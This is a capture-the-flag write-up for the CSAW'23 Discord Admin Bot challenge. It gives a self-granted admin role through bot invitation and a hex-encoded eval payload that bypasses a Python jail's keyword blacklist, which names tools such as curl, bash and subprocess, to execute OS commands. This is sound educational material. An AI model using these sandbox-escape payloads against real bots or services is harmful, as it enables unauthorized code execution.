# Discord Admin Bot

## Description

Join discord and get the flag.

discord.gg/csaw23
discord.gg/csaw23
discord.gg/csaw23
discord.gg/csaw23
discord.gg/csaw23
discord.gg/csaw23
discord.gg/csaw23
discord.gg/csaw23
discord.gg/csaw23
discord.gg/csaw23

`Author: Krishnan Navadia`

## Files

* [bot_send.py](files/bot_send.py)

## Solution

We are given a Discord bot written in Discord.py. It's relatively simple:

1. !flag
2. !add <num1> + <num2>
3. !sub <num1> - <num2>

I first joined the Discord and went over to `#discord-admin-bot`. A lot of people were spamming commands trying to get the flag:

```
!add client.add_roles(message.author, "ADMIN_ROLE") ; !flag
!flag role.name = ADMIN_ROLE
!add ("!add client.add_roles(message.author, "ADMIN_ROLE") ; eval('ctx.send("!flag")')"); !flag
```

However, the first thing I noticed when reading the source code was:

```python
admin_flag = any(role.name == ADMIN_ROLE for role in ctx.message.author.roles)
```

There is a conditional check when you run commands, and so if `admin_flag` does not evaluate to True, then you will never get to the `pyjail()` function which is where we can execute arbitrary Python code.

I had to think of a way to get 'ADMIN_ROLE' and spent some time researching how message contexts are passed. Then, I remembered an older CTF challenge I solved where we had to find a Discord server based on the server ID and nothing else. We are in the Discord, and we have access to the Bot's Client ID (assuming Developer mode is enabled). With a Client ID, you can [generate](https://discordapi.com/permissions.html) a bot invite link and invite the bot to your own server. 

Once you have the bot in your own server, the path forward is trivial. We need to create the role 'admin' and assign it to ourselves. Now, when we execute `!flag, !add, !sub` instead of a help message, we are able to actually execute commands. 

We know that `!add` and `!sub` call `pyjail()`. Let's take a look:

```python
arg = " ".join(list(args))
ans = pyjail(arg)

SHELL_ESCAPE_CHARS = [":", "curl", "bash", "bin", "sh", "exec", "eval,", "|", "import", "chr", "subprocess", "pty", "popen", "read", "get_data", "echo", "builtins", "getattr"]

COOLDOWN = []

def excape_chars(strings_array, text):
    return any(string in text for string in strings_array)

def pyjail(text):
    if excape_chars(SHELL_ESCAPE_CHARS, text):
        return "No shells are allowed"

    text = f"print(eval(\"{text}\"))"
    proc = subprocess.Popen(['python3', '-c', text], stdout=subprocess.PIPE, preexec_fn=os.setsid)
    output = ""
    try:
        out, err = proc.communicate(timeout=1)
        output = out.decode().replace("\r", "")
        print(output)
        print('terminating process now')
        proc.terminate()
    except Exception as e:
        proc.kill()
        print(e)

    if output:
        return f"```{output}```"

```

So, take the command `!add 3 + 3` for example. The arguments will be ['3', '+', '3']. Then, we join the list into a space separated string: "3 + 3". Lastly, it gets passed to `pyjail()` and executed in a subprocess:

```bash
python3 -c print(eval("3 + 3"))
```

Because we can control what gets passed to `pyjail()`, we have remote code execution. The only thing is to bypass the blacklist. Typically, you can call something like ` __import__('os').system('ls')`, but the blacklist prevents us from using `import`. Luckily, HackTricks has a page for [Bypass Python Sandboxes](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes), and I learned you can pass hex encoded strings to `eval()` and it will still execute!

A quick Python script to convert our payload to hex:

```python
payload = "__import__('os').system('cat flag.txt')"

for c in payload:
    hex_c = hex(ord(c))[2:]
    hex_c = "\\x" + hex_c
    print(hex_c, end="")

>> \x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74\x27\x29
```

Now, we just need to execute:

```
!add \x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74\x27\x29
```

`csawctf{Y0u_4r3_th3_fl4g_t0_my_pyj4il_ch4ll3ng3}`
